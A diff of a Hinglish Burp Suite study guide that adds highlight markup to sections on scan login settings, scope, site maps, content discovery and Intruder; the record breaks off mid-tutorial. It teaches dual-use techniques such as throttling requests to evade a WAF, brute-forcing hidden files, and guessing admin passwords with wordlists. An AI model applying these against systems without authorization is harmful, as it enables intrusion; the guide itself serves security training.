+- [[HL::**Application Login:** Agar tumhari target application mein authentication (login) hai, to tum Burp ko **credentials (username/password)** de sakte ho. Burp inka use karke automatically login karega aur authenticated pages ko bhi scan karega::HL]].
+- [[HL::**Resource Pool:** Ye **system resources (CPU, network) ko manage** karne ka tareeka hai.::HL]]
+    - [[HL::**Max Concurrent Requests:** Ek time par kitni parallel requests bhejni hain. High number ka matlab fast scan, lekin server par load bhi zyada.::HL]]
+    - [[HL::**Delay between requests:** Do requests ke beech mein kitna time gap (milliseconds mein). Ye useful hai **WAF (Web Application Firewall) ko bypass** karne ke liye, jo ki tezi se aane wali requests ko block kar deta hai::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-- **Problem (Auditing):** Default speed aur accuracy se scan karne par kabhi kabhi site slow ho jati hai, ya WAF block kar deta hai. Kabhi kabhi tumhe bahut deep analysis chahiye, kabhi sirf overview.
-- **Solution (Auditing):** Speed aur accuracy adjust karke tum scan ko apni zaroorat ke hisaab se **customize** kar sakte ho.
-- **Problem (Login):** Bina login diye, authenticated pages (dashboard, profile settings) scan nahi honge. Tum vulnerable areas miss kar doge.
-- **Solution (Login):** Credentials dekar, Burp ko **site ke andar tak bhejo**. Use wahi pages scan karne do jo ek normal logged-in user dekhta hai.
+- [[HL::**Problem (Auditing):** Default speed aur accuracy se scan karne par kabhi kabhi site slow ho jati hai, ya WAF block kar deta hai. Kabhi kabhi tumhe bahut deep analysis chahiye, kabhi sirf overview.::HL]]
+- [[HL::**Solution (Auditing):** Speed aur accuracy adjust karke tum scan ko apni zaroorat ke hisaab se **customize** kar sakte ho.::HL]]
+- [[HL::**Problem (Login):** Bina login diye, authenticated pages (dashboard, profile settings) scan nahi honge. Tum vulnerable areas miss kar doge.::HL]]
+- [[HL::**Solution (Login):** Credentials dekar, Burp ko **site ke andar tak bhejo**. Use wahi pages scan karne do jo ek normal logged-in user dekhta hai::HL]].
 - **Problem (Resources):** Agar tumne ek saath 50 requests bhej di, to target server crash ho sakta hai, ya tumhara internet slow ho sakta hai, ya tumhara IP block ho sakta hai.
 - **Solution (Resource Pool):** Max requests aur delay set karke tum **load ko control** karte ho. Safe aur stable scan.
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** New Scan wizard mein "Scan Details" screen ke baad (ya kuch versions mein same screen par) "Application Login" aur "Resource Pool" sections hote hain. Auditing settings kuch wizard mein advanced section mein milti hain.
-- **Appearance:**
-    - **Application Login:** Ek checkbox hogi **"Use application login"**. Us par click karne par options khulte hain:
-        - **"Add login sequence..."** : Yahan tum macro record kar sakte ho (advanced).
-        - **"Add login credentials..."** : Yahan simple username/password dal sakte ho.
+- [[HL::**Location:** New Scan wizard mein "Scan Details" screen ke baad (ya kuch versions mein same screen par) "Application Login" aur "Resource Pool" sections hote hain. Auditing settings kuch wizard mein advanced section mein milti hain::HL]].
+- **[[HL::Appearance::HL]]:**
+    - [[HL::**Application Login:** Ek checkbox hogi **"Use application login"**. Us par click karne par options khulte hain:::HL]]
+        - [[HL::**"Add login sequence..."** : Yahan tum macro record kar sakte ho (advanced).::HL]]
+        - [[HL::**"Add login credentials..."** : Yahan simple username/password dal sakte ho::HL]].
     - **Resource Pool:** Ek dropdown hoga **"Resource pool"** . Isme se "Default" ya "Create new" select kar sakte ho. "Create new" karne par ek naya window khulega jisme "Max concurrent requests" aur "Delay between requests" set kar sakte ho.
     - **Auditing Settings:** Ye kuch versions mein "Scan Configuration" ke andar detail mein milti hain. Ya wizard mein "Audit" section mein.
 
 ## ⚙️ 6. Under the Hood (Technical Working):
-1.  **Application Login (Simple Credentials):**
-    - Step 1: Tum username `admin` aur password `password123` dete ho.
-    - Step 2: Scan ke dauran jab Burp kisi page par login form detect karta hai (e.g., `/login` with `input name="user"` and `"pass"`), to wo automatically in credentials ko use karta hai.
+1.  **[[HL::Application Login (Simple Credentials)::HL]]:**
+    - [[HL::Step 1: Tum username `admin` aur password `password123` dete ho.::HL]]
+    - [[HL::Step 2: Scan ke dauran jab Burp kisi page par login form detect karta hai (e.g., `/login` with `input name="user"` and `"pass"`), to wo automatically in credentials ko use karta hai::HL]].
     - Step 3: Burp form submit karta hai, response check karta hai (e.g., `302 redirect` to `/dashboard`, ya cookie set hui) ki login successful hua ya nahi.
     - Step 4: Agar successful hua, to wo naye session cookies ke saath aage ki requests bhejta hai.
 
@@ -2665,8 +2665,8 @@ Socho tumhare ghar ke **gate par ek chowkidaar (guard)** hai. Tum use kuch speci
 - **Live Task:** Tum chowkidaar se kehte ho, "Ab tu **24x7 yahi gate par baitha reh**. Jo bhi andar aaye, uski nikalne tak 24 ghante record kar aur koi suspicious ho to turant bata." Ye hai **Live Task** – background mein continuously chalne wala process.
 
 ## 📖 3. Technical Definition (Interview Answer):
-**New Live Task** Burp Suite Professional ka ek feature hai jo **background mein continuously chalta rehta hai**. Jab tum browsing kar rahe ho, Proxy ke through jo bhi traffic guzarta hai, Live Task usko real-time monitor karta hai aur naye discover hue content par automatically scan chala deta hai.
-- **Tool Scope:** Tum specify kar sakte ho ki **kis tool ke traffic ko** Live Task monitor karega. Jaise sirf **Proxy** ka traffic, ya sirf **Repeater** ka, ya sabka.
+[[HL::**New Live Task** Burp Suite Professional ka ek feature hai jo **background mein continuously chalta rehta hai**. Jab tum browsing kar rahe ho, Proxy ke through jo bhi traffic guzarta hai, Live Task usko real-time monitor karta hai aur naye discover hue content par automatically scan chala deta hai.::HL]]
+- [[HL::**Tool Scope:** Tum specify kar sakte ho ki **kis tool ke traffic ko** Live Task monitor karega. Jaise sirf **Proxy** ka traffic, ya sirf **Repeater** ka, ya sabka::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 - **Problem:** Tum ek website manual test kar rahe ho. Tum proxy mein kuch requests intercept kar rahe ho, kuch Repeater mein bhej rahe ho. Tumhe lagta hai ki tumne saare areas cover kar liye. Lekin ho sakta hai ki tumhari manual interaction ke dauran koi naya endpoint discover ho (jaise koi link click kiya to ` /api/user/profile ` dikha). Agar tumne wahan manually scan nahi kiya, to vulnerability miss ho sakti hai.
@@ -2804,24 +2804,24 @@ Socho tum kisi **sheher (city) ka map** bana rahe ho.
 - **Filter Option:** Tum map mein sirf "Lal rang ke makaan" (JS files) dekhna chahte ho. To filter lagaoge. Ye hai filter.
 
 ## 📖 3. Technical Definition (Interview Answer):
-**Target Tab** Burp Suite ka central hub hai jo target application ke baare mein saari information ko organize karta hai. Iska main component hai **Site Map**.
-- **Site Map:** Left side panel mein ek tree structure hota hai jo saari crawled/spidered websites ko **hierarchical format** mein dikhata hai. Ye URLs, directories, files, parameters sab kuch include karta hai.
-- **Request/Response Details:** Jab tum site map mein kisi bhi URL par click karte ho, to right side panel mein us URL ke corresponding **request** (browser ne kya bheja) aur **response** (server ne kya wapas bheja) dikhta hai. Saath mein **method** (GET/POST) aur **status code** (200 OK, 404 Not Found, 302 Redirect) bhi dikhte hain.
-- **Filter Option:** Site map ke top par ek **filter bar** hota hai. Yahan tum status code, MIME type (HTML, JS, CSS), folder, ya search term ke hisaab se filter laga sakte ho. Jaise sirf "JavaScript files" dikhao.
+[[HL::**Target Tab** Burp Suite ka central hub hai jo target application ke baare mein saari information ko organize karta hai. Iska main component hai **Site Map**::HL]].
+- [[HL::**Site Map:** Left side panel mein ek tree structure hota hai jo saari crawled/spidered websites ko **hierarchical format** mein dikhata hai. Ye URLs, directories, files, parameters sab kuch include karta hai.::HL]]
+- [[HL::**Request/Response Details:** Jab tum site map mein kisi bhi URL par click karte ho, to right side panel mein us URL ke corresponding **request** (browser ne kya bheja) aur **response** (server ne kya wapas bheja) dikhta hai. Saath mein **method** (GET/POST) aur **status code** (200 OK, 404 Not Found, 302 Redirect) bhi dikhte hain.::HL]]
+- [[HL::**Filter Option:** Site map ke top par ek **filter bar** hota hai. Yahan tum status code, MIME type (HTML, JS, CSS), folder, ya search term ke hisaab se filter laga sakte ho. Jaise sirf "JavaScript files" dikhao::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
 - **Problem:** Tum ek website par kaam kar rahe ho. Tumne spider chalaaya, manual browsing ki, kuch requests intercept ki. Ab tumhare paas **hundreds of URLs** ka data hai. Tumhe samajh nahi aa raha ki kis URL par kya hai. Kis URL ne 404 diya? Kis URL mein POST method use hua? Kaun si JS files load hui?
 - **Solution (Site Map):** Site Map tumhe **visual representation** deta hai. Tum ek glance mein dekh sakte ho ki site ka structure kya hai, kaun se directories hain, kaun si files hain.
-- **Solution (Filter):** Tum filter laga ke sirf wahi URLs dikha sakte ho jo tumhe chahiye. Jaise sirf "404" status wale URLs dikhao (missing pages dhundhne ke liye) ya sirf "JS" files dikhao.
+- [[HL::**Solution (Filter):** Tum filter laga ke sirf wahi URLs dikha sakte ho jo tumhe chahiye. Jaise sirf "404" status wale URLs dikhao (missing pages dhundhne ke liye) ya sirf "JS" files dikhao::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** Burp Suite ke top tabs mein **"Target"** tab par click karo.
-- **Appearance:**
-    - **Left Side (Site Map):** Ek tree structure dikhega jisme root pe domain name hoga (e.g., `example.com`). Uske neeche expandable folders honge (`/`, `/admin`, `/api`, `/assets`). Aur unke andar files (`index.html`, `style.css`, `script.js`, `login.php`). Saare URLs yahan organize hain.
-    - **Right Side (Details):** Jab tum left side se koi URL select karte ho, to right side mein do tabs hote hain:
-        - **Request:** Browser ne server ko kya bheja.
-        - **Response:** Server ne kya wapas bheja.
-    - **Top (Filter Bar):** Ek search box jaisa area hoga jisme filter options hain. Jaise "Filter by MIME type" ka dropdown (HTML, CSS, JS, etc.) aur "Filter by status code" ka checkbox (2xx, 3xx, 4xx, 5xx).
+- [[HL::**Location:** Burp Suite ke top tabs mein **"Target"** tab par click karo.::HL]]
+- [[HL::**Appearance:**::HL]]
+    - [[HL::**Left Side (Site Map):** Ek tree structure dikhega jisme root pe domain name hoga (e.g., `example.com`). Uske neeche expandable folders honge (`/`, `/admin`, `/api`, `/assets`). Aur unke andar files (`index.html`, `style.css`, `script.js`, `login.php`). Saare URLs yahan organize hain.::HL]]
+    - [[HL::**Right Side (Details):** Jab tum left side se koi URL select karte ho, to right side mein do tabs hote hain:::HL]]
+        - [[HL::**Request:** Browser ne server ko kya bheja.::HL]]
+        - [[HL::**Response:** Server ne kya wapas bheja.::HL]]
+    - [[HL::**Top (Filter Bar):** Ek search box jaisa area hoga jisme filter options hain. Jaise "Filter by MIME type" ka dropdown (HTML, CSS, JS, etc.) aur "Filter by status code" ka checkbox (2xx, 3xx, 4xx, 5xx::HL]]).
 
 ## ⚙️ 6. Under the Hood (Technical Working):
 1.  **Data Collection:** Jab bhi tum kisi bhi tool se (Proxy, Spider, Scanner) kisi URL ka request/response handle karte ho, Burp automatically us information ko Target tab ke Site Map mein add kar deta hai.
@@ -2933,10 +2933,10 @@ Ya filter dropdown se "All" select karo.
 - **Scenario 2 (Filter galat lagana):** Tum filter laga ke sirf HTML files dekhe. Socha ki JS files hain hi nahi. Lekin asli mein JS files thi, lekin tumne filter ki wajah se nahi dekhi. Unmein hidden endpoints chhupe the jo tum miss kar gaye.
 
 ## ❓ 15. FAQ (Interview Questions):
-- **Q1: Target Tab mein Site Map kya hai?**
-    - **A1:** Website ka ek hierarchical map jo saare discovered URLs ko tree structure mein dikhata hai.
-- **Q2: Site Map mein filter kaise use karte ho?**
-    - **A2:** Filter bar mein status code, MIME type, ya search term ke hisaab se filter laga kar sirf relevant URLs dekh sakte hain.
+- [[HL::**Q1: Target Tab mein Site Map kya hai?**::HL]]
+    - [[HL::**A1:** Website ka ek hierarchical map jo saare discovered URLs ko tree structure mein dikhata hai.::HL]]
+- [[HL::**Q2: Site Map mein filter kaise use karte ho?**::HL]]
+    - [[HL::**A2:** Filter bar mein status code, MIME type, ya search term ke hisaab se filter laga kar sirf relevant URLs dekh sakte hain::HL]].
 - **Q3: Site Map aur HTTP History mein antar batao.**
     - **A3:** Site Map structure dikhata hai (website ka naksha), HTTP History time ke hisaab se traffic dikhata hai (CCTV footage).
 - **Q4: Tum site map mein kisi URL par click karoge to kya dikhega?**
@@ -2960,15 +2960,15 @@ Socho tum ek **detective** ho jo ek specific case (e.g., `demo.testfire.net` ban
 - **Issue Definition:** Ye ek **encyclopedia** hai jisme har type ke security issue (vulnerability) ki detail mein definition, cause, aur remediation (solution) likhi hoti hai. Jaise "SQL Injection kya hai? Kaise hota hai? Isse kaise theek karein?".
 
 ## 📖 3. Technical Definition (Interview Answer):
-- **Scope (Target Tab):** Scope ka matlab hai **current testing project ki boundaries define karna**. Tum Target tab mein kisi bhi host ya URL par right-click karke "Add to scope" kar sakte ho. Scope set karne se tum Burp ko bata dete ho ki kis site par kaam karna hai aur kis par nahi. Ye saare tools (Proxy, Spider, Scanner) ke behavior ko affect karta hai.
-    - **Include in scope:** Jis URL ya domain par attack/test karna hai.
-    - **Exclude from scope:** Jis directory ya URL ko test se bahar rakhna hai (e.g., logout links, third-party domains).
-- **Right-Click Options (Send to...):** Target tab ke site map mein kisi bhi URL/request par right-click karne se ek context menu khulta hai jisme tum use **Repeater, Intruder, Sequencer, Comparer** jaise tools mein bhej sakte ho for further manual testing.
+- [[HL::**Scope (Target Tab):** Scope ka matlab hai **current testing project ki boundaries define karna**. Tum Target tab mein kisi bhi host ya URL par right-click karke "Add to scope" kar sakte ho. Scope set karne se tum Burp ko bata dete ho ki kis site par kaam karna hai aur kis par nahi. Ye saare tools (Proxy, Spider, Scanner) ke behavior ko affect karta hai::HL]].
+    - [[HL::**Include in scope:** Jis URL ya domain par attack/test karna hai.::HL]]
+    - [[HL::**Exclude from scope:** Jis directory ya URL ko test se bahar rakhna hai (e.g., logout links, third-party domains::HL]]).
+- [[HL::**Right-Click Options (Send to...):** Target tab ke site map mein kisi bhi URL/request par right-click karne se ek context menu khulta hai jisme tum use **Repeater, Intruder, Sequencer, Comparer** jaise tools mein bhej sakte ho for further manual testing::HL]].
 - **Issue Definition:** Target tab ke andar ek sub-tab hota hai **"Issue definition"** . Ye Burp Suite ka built-in vulnerability reference library hai. Yahan tum kisi bhi vulnerability ke baare mein padh sakte ho, uski severity, reliability, aur remediation ke baare mein jaankari le sakte ho.
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-- **Problem (No Scope):** Agar tum scope define nahi karte, to Burp har us URL ko process karega jo use milega, chahe wo tumhari target site ho ya nahi. Isse tum galti se kisi aur ki site scan kar sakte ho (legal issue) aur tumhara system bhi slow ho sakta hai.
-- **Solution (Scope):** Scope define karke tum Burp ko focus karte ho. Sirf in-scope items ko spider karo, sirf in-scope items ko intercept karo, etc.
+- [[HL::**Problem (No Scope):** Agar tum scope define nahi karte, to Burp har us URL ko process karega jo use milega, chahe wo tumhari target site ho ya nahi. Isse tum galti se kisi aur ki site scan kar sakte ho (legal issue) aur tumhara system bhi slow ho sakta hai.::HL]]
+- [[HL::**Solution (Scope):** Scope define karke tum Burp ko focus karte ho. Sirf in-scope items ko spider karo, sirf in-scope items ko intercept karo, etc::HL]].
 - **Problem (Manual Workflow):** Tum site map mein koi interesting request dekh rahe ho. Use Intruder mein bhejne ke liye turant wahan jaana padta hai.
 - **Solution (Right-Click):** Right-click → Send to Intruder se request ek click mein Intruder tab mein copy ho jati hai. Time bachta hai.
 - **Problem (Unclear Vulnerability):** Scanner ne koi vulnerability report ki, lekin tumhe samajh nahi aa raha ki ye vulnerability asli mein kya hai aur isse kaise theek karein.
@@ -2992,9 +2992,9 @@ Socho tum ek **detective** ho jo ek specific case (e.g., `demo.testfire.net` ban
     - **Issue Definition:** Target tab ke andar ek aur sub-tab hota hai **"Issue definitions"** . Yahan ek list hogi vulnerabilities ki (e.g., SQL Injection, XSS, Path Traversal). Kisi par click karo to definition dikhegi.
 
 ## ⚙️ 6. Under the Hood (Technical Working):
-1.  **Scope Working:**
-    - Jab tum kisi URL ko "Add to scope" karte ho, to Burp us URL ko apni internal scope list mein add kar deta hai.
-    - Ab har tool (Proxy, Spider, Scanner) jab bhi koi request process karta hai, to pehle check karta hai ki ye request in-scope hai ya nahi.
+1.  [[HL::**Scope Working:**::HL]]
+    - [[HL::Jab tum kisi URL ko "Add to scope" karte ho, to Burp us URL ko apni internal scope list mein add kar deta hai.::HL]]
+    - [[HL::Ab har tool (Proxy, Spider, Scanner) jab bhi koi request process karta hai, to pehle check karta hai ki ye request in-scope hai ya nahi::HL]].
     - Proxy mein tum "Intercept in-scope only" rule laga sakte ho.
     - Spider mein tum "Scope" option tick kar sakte ho taaki wo sirf in-scope URLs follow kare.
 
@@ -3156,32 +3156,32 @@ Socho tumhe kisi **purane school building** mein chhupi hui cheezein dhundhni ha
 - **Content Discovery:** Tumhare paas ek **purani school ki map (list)** hai jisme likha hai: "Basement ka secret room", "Roof par water tank ke peeche", "Library ki chhupi hui almari". Tum in cheezo ko **deliberately dhundhne** nikalte ho, chahe wahan jaane ka sign board ho ya na ho. Ye hai **Content Discovery** – hidden files/folders dhundhna.
 
 ## 📖 3. Technical Definition (Interview Answer):
-**Content Discovery** Burp Suite Professional ka ek feature hai jo **hidden directories aur files** ko dhundhne ke liye ek automated trial scan chalaata hai. Ye kaam karne ke liye ye ek **pre-defined wordlist** (common files aur directories ki list) use karta hai aur unhe target URL ke saath join karta hai. Jaise:
-- Wordlist mein "admin" hai → try karo `https://example.com/admin`
-- Wordlist mein "backup.zip" hai → try karo `https://example.com/backup.zip`
-- Wordlist mein "phpinfo.php" hai → try karo `https://example.com/phpinfo.php`
+[[HL::**Content Discovery** Burp Suite Professional ka ek feature hai jo **hidden directories aur files** ko dhundhne ke liye ek automated trial scan chalaata hai. Ye kaam karne ke liye ye ek **pre-defined wordlist** (common files aur directories ki list) use karta hai aur unhe target URL ke saath join karta hai. Jaise:::HL]]
+- [[HL::Wordlist mein "admin" hai → try karo `https://example.com/admin`::HL]]
+- [[HL::Wordlist mein "backup.zip" hai → try karo `https://example.com/backup.zip`::HL]]
+- [[HL::Wordlist mein "phpinfo.php" hai → try karo `https://example.com/phpinfo.php`::HL]]
 
-Jo bhi request successful (e.g., 200 OK) hoti hai, use content ke roop mein discover kar liya jaata hai.
+[[HL::Jo bhi request successful (e.g., 200 OK) hoti hai, use content ke roop mein discover kar liya jaata hai.::HL]]
 
-**Difference (Crawling vs Content Discovery):**
-- **Crawling/Spidering:** Sirf unhi links ko follow karta hai jo page par pehle se **maujood** hain (jaise `<a href="...">` tags).
-- **Content Discovery:** Hidden content ko dhundhne ke liye **potential files aur folders ki list** use karta hai jo page par mention nahi hain.
+**[[HL::Difference (Crawling vs Content Discovery)::HL]]:**
+- [[HL::**Crawling/Spidering:** Sirf unhi links ko follow karta hai jo page par pehle se **maujood** hain (jaise `<a href="...">` tags).::HL]]
+- [[HL::**Content Discovery:** Hidden content ko dhundhne ke liye **potential files aur folders ki list** use karta hai jo page par mention nahi hain::HL]].
 
 ## 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-- **Problem:** Crawling se tum sirf wahi pages dekhoge jo website ne intentionally publicly accessible rakhe hain. Lekin hacker ki nazar un **hidden pages** par hoti hai jo developer ne accidentally chhod diye – jaise `/backup/`, `/old/`, `/admin-panel/`, `.git/`, `config.php.bak`. Ye pages kisi link se connected nahi hote, isliye crawler unhe kabhi discover nahi kar payega.
-- **Solution:** Content Discovery **brute-force** ki tarah kaam karta hai. Ye common file/directory names ki list lekar har possible combination try karta hai. Isse woh hidden treasures mil jate hain jo crawler ki pahunch se bahar the.
+- [[HL::**Problem:** Crawling se tum sirf wahi pages dekhoge jo website ne intentionally publicly accessible rakhe hain. Lekin hacker ki nazar un **hidden pages** par hoti hai jo developer ne accidentally chhod diye – jaise `/backup/`, `/old/`, `/admin-panel/`, `.git/`, `config.php.bak`. Ye pages kisi link se connected nahi hote, isliye crawler unhe kabhi discover nahi kar payega.::HL]]
+- [[HL::**Solution:** Content Discovery **brute-force** ki tarah kaam karta hai. Ye common file/directory names ki list lekar har possible combination try karta hai. Isse woh hidden treasures mil jate hain jo crawler ki pahunch se bahar the::HL]].
 
 ## 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-- **Location:** Ye feature Burp Pro mein multiple jagah se accessible hai:
-    1.  **Target tab** mein kisi bhi directory par right-click → **"Engagement tools"** → **"Discover content"** .
-    2.  **Dashboard** mein **"New Scan"** wizard ke dauran bhi option milta hai.
-- **Appearance (Engagement Tools se):**
-    - Ek naya window khulega jiska naam hoga **"Content discovery"** .
-    - Isme kuch tabs honge:
-        - **Control:** Start, stop, pause buttons.
-        - **Site map:** Jo content discover hoga, wo yahan tree mein dikhega.
-        - **Config:** Yahan settings set kar sakte ho – wordlist, file extensions, threads, etc.
-        - **Output:** Live log of requests being made.
+- [[HL::**Location:** Ye feature Burp Pro mein multiple jagah se accessible hai:::HL]]
+    1.  [[HL::**Target tab** mein kisi bhi directory par right-click → **"Engagement tools"** → **"Discover content"** .::HL]]
+    2.  [[HL::**Dashboard** mein **"New Scan"** wizard ke dauran bhi option milta hai::HL]].
+- **[[HL::Appearance (Engagement Tools se)::HL]]:**
+    - [[HL::Ek naya window khulega jiska naam hoga **"Content discovery"** .::HL]]
+    - [[HL::Isme kuch tabs honge:::HL]]
+        - [[HL::**Control:** Start, stop, pause buttons.::HL]]
+        - [[HL::**Site map:** Jo content discover hoga, wo yahan tree mein dikhega.::HL]]
+        - [[HL::**Config:** Yahan settings set kar sakte ho – wordlist, file extensions, threads, etc.::HL]]
+        - [[HL::**Output:** Live log of requests being made::HL]].
 
 ## ⚙️ 6. Under the Hood (Technical Working):
 1.  **Wordlist Loading:** Tum content discovery start karte ho. Burp apni built-in wordlist load karta hai (ya tum custom de sakte ho). Is list mein common names hote hain: `admin`, `backup`, `test`, `old`, `temp`, `images`, `css`, `js`, `php`, `asp`, etc.
@@ -3363,95 +3363,95 @@ Socho tum ek **machine gun** chala rahe ho (wohi Intruder). Us machine gun mein 
 - **Options:** Ye **advanced settings** hain – jaise ki goli lagne ke baad kya signal milega (response mein "Login Failed" dhundo), ya error aaye toh kya karna hai.
 
 ### 📖 3. Technical Definition (Interview Answer):
-**Intruder** Burp Suite ka ek tool hai jo automated **brute-force** aur **fuzzing** attacks karta hai. Iske 5 main tabs hote hain jo attack ko control karte hain:
-- **Target:** Attack ka destination (host aur port).
-- **Positions:** Request mein wo jagah jahan payload insert hoga.
-- **Payloads:** Wo values jo positions par place hongi.
-- **Resource Pool:** Attack ki speed aur resources limit karta hai.
-- **Options:** Attack ke behavior ko fine-tune karta hai (matching, throttling, etc.).
+[[HL::**Intruder** Burp Suite ka ek tool hai jo automated **brute-force** aur **fuzzing** attacks karta hai. Iske 5 main tabs hote hain jo attack ko control karte hain:::HL]]
+- [[HL::**Target:** Attack ka destination (host aur port).::HL]]
+- [[HL::**Positions:** Request mein wo jagah jahan payload insert hoga.::HL]]
+- [[HL::**Payloads:** Wo values jo positions par place hongi.::HL]]
+- [[HL::**Resource Pool:** Attack ki speed aur resources limit karta hai.::HL]]
+- [[HL::**Options:** Attack ke behavior ko fine-tune karta hai (matching, throttling, etc::HL]].).
 
 ### 🧠 4. Zaroorat Kyun Hai? (Why use it?):
-**Problem:** Maan lo tumhe kisi website ka **admin password** guess karna hai. Tum manually ek-ek password daaloge toh saal lag jayenge. Server bhi tumhe block kar dega agar bahut jald requests bhejoge.
-**Solution:** Intruder ke tabs tumhe **fine control** dete hain – kis URL par attack karna hai (Target), kis field mein daalna hai (Positions), kaunsi wordlist use karni hai (Payloads), kitni speed se bhejna hai (Resource Pool), aur response mein kya dhundhna hai (Options). In tabs ki madad se tum **precise aur efficient** attack kar sakte ho.
+**Problem:** [[HL::Maan lo tumhe kisi website ka **admin password** guess karna hai. Tum manually ek-ek password daaloge toh saal lag jayenge. Server bhi tumhe block kar dega agar bahut jald requests bhejoge.::HL]]
+[[HL::**Solution:** Intruder ke tabs tumhe **fine control** dete hain – kis URL par attack karna hai (Target), kis field mein daalna hai (Positions), kaunsi wordlist use karni hai (Payloads), kitni speed se bhejna hai (Resource Pool), aur response mein kya dhundhna hai (Options). In tabs ki madad se tum **precise aur efficient** attack kar sakte ho::HL]].
 
 ### 🔍 5. Visual - Jab Screen Par Kya Dikhega:
-Jab tum kisi request ko "Send to Intruder" karoge (right-click → Send to Intruder), aur phir **Intruder** tab par jaoge, toh tumhe top par 5 tabs dikhenge:
-- **Target** (default open hota hai)
-- **Positions**
-- **Payloads**
-- **Resource Pool**
-- **Options**
+[[HL::Jab tum kisi request ko "Send to Intruder" karoge (right-click → Send to Intruder), aur phir **Intruder** tab par jaoge, toh tumhe top par 5 tabs dikhenge:::HL]]
+- [[HL::**Target** (default open hota hai)::HL]]
+- [[HL::**Positions**::HL]]
+- [[HL::**Payloads**::HL]]
+- [[HL::**Resource Pool**::HL]]
+- [[HL::**Options**::HL]]
 
-**Target Tab ki Screen:**
+**[[HL::Target Tab ki Screen::HL]]:**
 ```
-Target: http://example.com
-Port: 80
-[Use HTTPS] checkbox
+[[HL::Target: http://example.com::HL]]
+[[HL::Port: 80::HL]]
+[[HL::[Use HTTPS] checkbox::HL]]
 ```
-Yahan tum host aur port edit kar sakte ho.
+[[HL::Yahan tum host aur port edit kar sakte ho::HL]].
 
 ### ⚙️ 6. Under the Hood (Technical Working):
-Intruder ka internal flow kuch yu hai:
-1. **Target Tab:** Jo request tumne bheji thi, uska host aur port extract hota hai. Tum use change kar sakte ho.
-2. **Positions Tab:** Burp request ko parse karta hai aur automatically parameters (query string, body, cookies) ko highlight karta hai. Tum positions manually mark kar sakte ho.
-3. **Payloads Tab:** Tum payload list set karte ho (e.g., passwords.txt). Burp har payload ko positions mein insert karta hai attack type ke hisaab se.
-4. **Resource Pool:** Yahan tum network thread pool configure karte ho – kitne concurrent requests bhejni hain.
-5. **Options Tab:** Har response ko process karta hai (grep match, grep extract) aur attack ka result dikhata hai.
+[[HL::Intruder ka internal flow kuch yu hai:::HL]]
+1. [[HL::**Target Tab:** Jo request tumne bheji thi, uska host aur port extract hota hai. Tum use change kar sakte ho.::HL]]
+2. [[HL::**Positions Tab:** Burp request ko parse karta hai aur automatically parameters (query string, body, cookies) ko highlight karta hai. Tum positions manually mark kar sakte ho.::HL]]
+3. [[HL::**Payloads Tab:** Tum payload list set karte ho (e.g., passwords.txt). Burp har payload ko positions mein insert karta hai attack type ke hisaab se.::HL]]
+4. [[HL::**Resource Pool:** Yahan tum network thread pool configure karte ho – kitne concurrent requests bhejni hain.::HL]]
+5. [[HL::**Options Tab:** Har response ko process karta hai (grep match, grep extract) aur attack ka result dikhata hai::HL]].
 
 ### 💻 7. Hands-On: Step-by-Step Practical (Sabse Important Part):
 **Step 1: Request Intruder mein bhejo**
 ```text
-- Browser mein kuch karo (jaise login form submit karo).
-- Burp Proxy mein request intercept karo (ya HTTP history mein se uthao).
-- Request par RIGHT-CLICK karo → Menu khulega → "Send to Intruder" par click karo.
+- [[HL::Browser mein kuch karo (jaise login form submit karo).::HL]]
+- [[HL::Burp Proxy mein request intercept karo (ya HTTP history mein se uthao).::HL]]
+- [[HL::Request par RIGHT-CLICK karo → Menu khulega → "Send to Intruder" par click karo::HL]].
 ```
-**Step 2: Intruder tab open karo**
+[[HL::**Step 2: Intruder tab open karo**::HL]]
 ```text
-- Burp ke top menu mein "Intruder" tab par click karo.
-- Ab tum Intruder ke andar ho. Default "Target" tab khulega.
+- [[HL::Burp ke top menu mein "Intruder" tab par click karo.::HL]]
+- [[HL::Ab tum Intruder ke andar ho. Default "Target" tab khulega::HL]].
 ```
-**Step 3: Target Tab – Verify target**
+[[HL::**Step 3: Target Tab – Verify target**::HL]]
 ```text
-- Target tab mein tumhe request ka host aur port dikhega. (Jaise: example.com, port 80)
-- Agar HTTPS chahiye toh "Use HTTPS" check kar lo.
-- Usually yahan kuch change nahi karte, lekin agar attack kisi aur server par karna ho toh host change kar sakte ho.
+- [[HL::Target tab mein tumhe request ka host aur port dikhega. (Jaise: example.com, port 80)::HL]]
+- [[HL::Agar HTTPS chahiye toh "Use HTTPS" check kar lo.::HL]]
+- [[HL::Usually yahan kuch change nahi karte, lekin agar attack kisi aur server par karna ho toh host change kar sakte ho.::HL]]
 ```
-**Step 4: Positions Tab – Parameters mark karo**
+[[HL::**Step 4: Positions Tab – Parameters mark karo**::HL]]
 ```text
-- "Positions" tab par click karo.
-- Yahan tumhe poori request dikhegi jisme kuch parameters automatically highlight honge (unke around § symbol hoga).
-- Agar tum sirf password field test karna chahte ho, toh pehle "Clear §" button click karo (saare marks hata do).
-- Phir password field ki value (e.g., "password=123") select karo aur "Add §" button click karo. Ab waisa dikhega: password=§123§.
+- [[HL::"Positions" tab par click karo.::HL]]
+- [[HL::Yahan tumhe poori request dikhegi jisme kuch parameters automatically highlight honge (unke around § symbol hoga).::HL]]
+- [[HL::Agar tum sirf password field test karna chahte ho, toh pehle "Clear §" button click karo (saare marks hata do).::HL]]
+- [[HL::Phir password field ki value (e.g., "password=123") select karo aur "Add §" button click karo. Ab waisa dikhega: password=§123::HL]]§.
 ```
 **Step 5: Payloads Tab – Wordlist daalo**
 ```text
-- "Payloads" tab par click karo.
-- "Payload Options" mein "Load..." button click karo.
-- Apni wordlist file select karo (e.g., passwords.txt). Ya "Add" se manually entries daalo.
-- Neche "Payload Processing" aur "Payload Encoding" options hain (advanced).
+- "[[HL::Payloads" tab par click karo.::HL]]
+- [[HL::"Payload Options" mein "Load..." button click karo.::HL]]
+- [[HL::Apni wordlist file select karo (e.g., passwords.txt). Ya "Add" se manually entries daalo.::HL]]
+- [[HL::Neche "Payload Processing" aur "Payload Encoding" options hain (advanced::HL]]).
 ```
-**Step 6: Resource Pool – Speed set karo**
